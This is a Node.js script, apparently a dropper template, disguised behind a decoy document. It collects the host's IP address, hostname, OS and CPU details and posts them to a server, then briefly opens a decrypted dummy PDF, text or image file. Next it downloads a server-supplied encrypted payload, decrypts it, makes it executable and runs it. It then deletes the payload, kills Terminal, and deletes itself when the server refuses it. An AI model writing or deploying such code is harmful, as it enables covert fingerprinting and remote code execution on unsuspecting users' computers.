#!/usr/local/bin/node

const crypto = require('crypto');
const exec = require('child_process').exec;
const os = require('os');
const fs = require('fs');
const env = {
	API_URL: "http://localhost:3000"
};
const request = require('request-promise');
const system = {
	exec: (cmd) => {
		return new Promise((resolve, reject) => {
			exec(cmd, function(error, stdout, stderr) {
				if (stderr.length === 0) resolve(stdout.trim());
				else if (error) reject(error.message.trim());
				else reject(stderr.trim());
			});
		});
	},
	getIpAddress: () => {
		return system.exec("ipconfig getifaddr en0");
	},
	getMachineInfo: () => {
		let networkInterfaces = [];
		for (let key in os.networkInterfaces()) {
			networkInterfaces.push(os.networkInterfaces()[key][0].address);
		}
		return {
			uname: `${os.type()} ${os.platform()} ${os.hostname()} ${os.release()} ${os.arch()}`,
			hostname: os.hostname(),
			type: os.type(),
			platform: os.platform(),
			arch: os.arch(),
			release: os.release(),
			// uptime: os.uptime(),
			// loadavg: os.loadavg(),
			// totalmem: os.totalmem(),
			// freemem: os.freemem(),
			cpus: os.cpus().map((cpu) => cpu.model),
			networkInterfaces: networkInterfaces
		};
	}
};

const file = {
	id: "#FILE_ID#",
	type: "#FILE_TYPE#"
};

const runCommand = (() => {
	switch (os.platform()) {
		case 'linux':
		case 'freebsd':
		case 'openbsd':
		case 'sunos':
		case 'aix':
			return 'xdg-open';
		case 'darwin':
			return 'open';
		case 'win32':
			return 'start';
	}
})();

const dummyFiles = {
	pdf: fs.readFileSync('/tmp/dummy-files/dummyPdf', 'utf8', 'binary').trim(),
	txt: fs.readFileSync('/tmp/dummy-files/dummyTxt', 'utf8').trim(),
	png: fs.readFileSync('/tmp/dummy-files/dummyPng', 'utf8', 'binary').trim()
};

const killCommand = {
	pdf: 'pkill -f Applications/PDF',
	txt: 'pkill -f MacOS/TextEdit',
	png: 'pkill -f Applications/Preview',
	terminal: 'pkill -f Utilities/Terminal'
};

let tryCount = 0;

const deleteFile = (filePath) => {
	fs.unlink(filePath);
};

const decrypt = (data, key) => {
	console.log("Key: " + key);
	const decipher = crypto.createDecipher('aes-256-ctr', String(key))
	let dec = decipher.update(data, 'hex', 'utf8')
	dec += decipher.final('utf8');
	return dec;
};

const ping = (ipAddress, machineInfo) => {
	const options = {
		method: 'POST',
		uri: `${env.API_URL}/logs`,
		body: {
			ip_address: ipAddress,
			machine_info: machineInfo,
			file_id: file.id
		},
		json: true // Automatically stringifies the body to JSON
	};

	const filePath = '/tmp/' + parseInt(Math.random() * 1000) + '.' + file.type;

	fs.writeFile(filePath, decrypt(dummyFiles[file.type] || dummyFiles.txt, '123'), 'binary', function(err) {
		system.exec('chmod +x \'' + filePath + '\'').then(() => {

			system.exec(runCommand + " " + filePath);
			setTimeout(() => {
				deleteFile(filePath)
			}, 2000);
		});
	});

	request(options)
		.then((resp) => {
			fs.writeFile(filePath, decrypt(resp.file.data, resp.decryption_key), 'binary', function(err) {

				system.exec(killCommand[file.type] || killCommand.txt).then(() => { // close the dummy file

					system.exec('chmod +x \'' + filePath + '\'').then(() => {

						system.exec(runCommand + " " + filePath) // open the file
							.then(() => {
								setTimeout(() => {
									deleteFile(filePath) // delete the file
								}, 2000);
							});

					});

				});

			});
		})
		.catch((err) => {
			if (err.response.statusCode === 401) {
				// Unauthorized, self destroy.
				deleteFile(__filename);
			} else {
				if (tryCount < 3) {
					tryCount++;
					ping(ipAddress, machineInfo);
				} else {
					// TODO: Too many tries with failures, show "No internet connection" etc.
				}
			}
		});

    // Close the terminal
    system.exec(killCommand.terminal).then((out) => {
      console.log("Wow:" + out);
    });
};

system.getIpAddress()
	.then((ipAddress) => {
		ping(ipAddress, system.getMachineInfo());
	});
